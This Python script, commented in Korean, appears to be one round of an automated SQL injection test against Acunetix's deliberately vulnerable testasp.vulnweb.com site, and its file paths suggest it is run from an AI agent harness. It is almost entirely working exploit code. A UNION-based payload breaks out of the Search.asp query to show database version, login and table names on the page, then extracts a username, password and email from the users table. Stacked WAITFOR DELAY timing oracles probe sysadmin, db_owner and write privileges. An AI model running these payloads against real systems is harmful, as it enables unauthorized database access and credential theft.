#!/usr/bin/env python3
"""Round 7 보강 2 — UNION 기반 페이지 가시 추출(Search.asp) + stacked 문장 실행/권한 오라클.

배경(추론):
  * Search.asp 는 같은 파라미터가 **단 한 개의 쿼리**에만 쓰인다(반면 showforum/showthread 는
    동일 id 가 컬럼 수가 다른 3~4개 쿼리에 재사용되어 UNION 컬럼 수를 맞출 수 없다).
  * 이전 라운드의 UNION 실패는 페이로드 형태 문제였을 가능성이 크다 — Search 쿼리는
      ... AND (CHARINDEX(a.title, '<st>')>0 OR CHARINDEX(a.message,'<st>')>0)
    구조라 `st` 를 그냥 `0 UNION SELECT ...--` 로 넣으면 앞부분 따옴표/괄호가 닫히지 않아
    500 이 난다. `q')>0) UNION ALL SELECT ...--` 형태로 **괄호를 닫고** 나가야 한다.
  * 실행되는 SELECT 리스트는 페이지에 그대로 렌더된다(poster/title/message/ttitle/name) →
    블라인드 없이 페이지에서 직접 데이터가 보이는 PoC 가 가능.
"""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r7"
EVI = f"{J}/evidence/r7"
os.makedirs(SCR, exist_ok=True)
os.makedirs(EVI, exist_ok=True)


def run(url, body_out=None, timeout=60):
    bod = body_out or f"{SCR}/_b.tmp"
    cmd = ["curl", "-s", "-S"] + PROXY + [
        "-m", str(timeout), "-D", f"{SCR}/_h.tmp", "-o", bod,
        "-w", "%{http_code} %{size_download} %{time_total}", url]
    r = subprocess.run(cmd, capture_output=True, text=True)
    info = (r.stdout or "").strip() or "ERR " + (r.stderr or "").strip()[:100]
    try:
        body = open(bod, "rb").read().decode("latin-1")
    except OSError:
        body = ""
    return info, body


def save(name, text):
    with open(f"{EVI}/{name}", "w", encoding="latin-1") as f:
        f.write(text)


def search_union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    url = f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe="")
    info, body = run(url, body_out=f"{SCR}/U_{tag}.html")
    # 렌더된 결과 행만 뽑기: posttitle/posttext/path div
    marks = []
    for key in ("ACU-", "posttitle'>", "posttext'>"):
        i = body.find(key)
        if i >= 0:
            marks.append(" ".join(body[i:i + 220].split()))
    return info, body, marks


print("=" * 72)
print("U1. Search.asp UNION 기반 결과 주입 (마커 확인)")
print("=" * 72)
verify = "1,'ACU-POSTER','ACU-TITLE','ACU-MESSAGE',1,1,GETDATE(),'ACU-AVATAR','ACU-TTITLE','ACU-FORUM'"
info, body, marks = search_union(verify, "verify")
print(f"  {info}")
print(f"  raw payload: q')>0) UNION ALL SELECT {verify}--")
for m in marks:
    print("   ·", m)
print("  마커 5개 중 발견:", sum(x in body for x in
      ["ACU-POSTER", "ACU-TITLE", "ACU-MESSAGE", "ACU-TTITLE", "ACU-FORUM"]), "/5")
save("r7_U1_search_union_verify.html", body)

print()
print("=" * 72)
print("U2. 페이지 가시 추출 — DB/계정 정보")
print("=" * 72)
extracts = [
    ("version", "1,(SELECT SUSER_SNAME()),CAST((SELECT @@version) AS nvarchar(400)),(SELECT DB_NAME()),1,1,GETDATE(),'A','TT',(SELECT TOP 1 name FROM sys.tables)"),
    ("tables", "1,(SELECT TOP 1 name FROM sys.tables),'T','M',1,1,GETDATE(),'A','TT',(SELECT TOP 1 name FROM sys.tables)"),
]
for tag, lst in extracts:
    info, body, marks = search_union(lst, tag)
    print(f"  [{tag}] {info}")
    for m in marks:
        print("   ·", m)
    save(f"r7_U2_{tag}.html", body)

print()
print("=" * 72)
print("U3. users 테이블 자격증명 1건 (읽기 전용, 최소 추출)")
print("=" * 72)
lst = ("1,(SELECT TOP 1 uname FROM users),(CAST((SELECT TOP 1 upass FROM users) AS nvarchar(200)))"
       ",(CAST((SELECT TOP 1 email FROM users) AS nvarchar(200))),1,1,GETDATE(),'A','TT','FN'")
info, body, marks = search_union(lst, "users")
print(f"  {info}")
for m in marks:
    print("   ·", m)
save("r7_U3_users_row.html", body)

print()
print("=" * 72)
print("S1. stacked 문장 실행 차분 오라클 (showthread.asp id, 사이트 2곳 → 2배 지연)")
print("=" * 72)
for p, desc in [("0;IF 1=1 WAITFOR DELAY '0:0:04'--", "IF 참 (지연 기대)"),
                ("0;IF 1=2 WAITFOR DELAY '0:0:04'--", "IF 거짓 (지연 없음 기대)"),
                ("0", "기준선")]:
    info, _ = run(f"{BASE}/showthread.asp?id=" + urllib.parse.quote(p, safe=""))
    print(f"  {p:40} {info}   ({desc})")

print()
print("=" * 72)
print("S2. DB 권한 오라클 (권한 확인만, 쓰기 없음)")
print("=" * 72)
privs = [
    ("sysadmin", "(SELECT IS_SRVROLEMEMBER('sysadmin'))=1"),
    ("db_owner", "(SELECT IS_MEMBER('db_owner'))=1"),
    ("db_datawriter", "(SELECT IS_MEMBER('db_datawriter'))=1"),
    ("db_datareader", "(SELECT IS_MEMBER('db_datareader'))=1"),
    ("securityadmin", "(SELECT IS_SRVROLEMEMBER('securityadmin'))=1"),
    ("USER=dbo", "(SELECT USER_NAME())='dbo'"),
    ("SUSER=acunetix", "(SELECT SUSER_SNAME())='acunetix'"),
    ("INSERT perm on posts", "(SELECT HAS_PERMS_BY_NAME('posts','OBJECT','INSERT'))=1"),
]
for label, cond in privs:
    p = f"0;IF {cond} WAITFOR DELAY '0:0:04'--"
    info, _ = run(f"{BASE}/showthread.asp?id=" + urllib.parse.quote(p, safe=""))
    print(f"  [{label:20}] {info}   ← {cond}")

print()
print("done")
